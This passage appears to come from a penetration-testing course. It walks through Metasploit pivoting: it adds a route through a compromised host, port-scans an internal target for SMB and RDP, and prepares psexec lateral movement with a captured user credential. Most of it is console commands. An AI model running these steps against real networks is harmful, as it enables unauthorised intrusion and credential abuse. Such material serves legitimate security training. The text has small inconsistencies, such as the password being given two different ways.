Now that we have a working session on the compromised system, we can background it. To add a route to a network reachable through a compromised host, we can use route add with the network information and session ID that the route applies to. After adding the route, we can display the current routes with route print.

```
meterpreter > bg
[*] Backgrounding session 12...
msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added
msf6 exploit(multi/handler) > route print
```

With a path cleared to the internal network, we can enumerate this subnet. Now we could see the whole network for live hosts with a post scan auxiliary module. Since this scan would take some time, let's shorten this by setting RHOSTS to 172.16.5.20. For now, we only want to scan ports 445 and 3389.

```
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(portscan/tcp > set RHOSTS 172.16.5.20
RHOSTS = 172.16.5.20
```

```
msf6 auxiliary(portscan/tcp) > set PORTS 445,3389
```

Listing 693 - Portscan of SMB and RDP

Using our pivot host ITWK01 to perform operations on the target.

First, we attempt to use the psexec¹ to get access on the target user as luiza. In the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully capture the NTLM hash and the clear-text password is BocieAeroMeow1!. For psexec to work, luiza has a local administrator on the second machine. For this machine, let's assume we have this information gathering.

Let's use SMBUser exploit and set SMBUser to luiza, SMBPass to BocieAeroMeow1, and RHOSTS to 172.16.5.200.

It's important to note that the exploit will only work with established connections. Because of this, the new shell on the target must be a bind shell such as windows/x64/meterpreter/bind.tcp, allowing us to use the route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in situations where the target does not have a route for our network.

```
msf6 exploit(windows/smb/psexec)
[+] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser = luiza
```
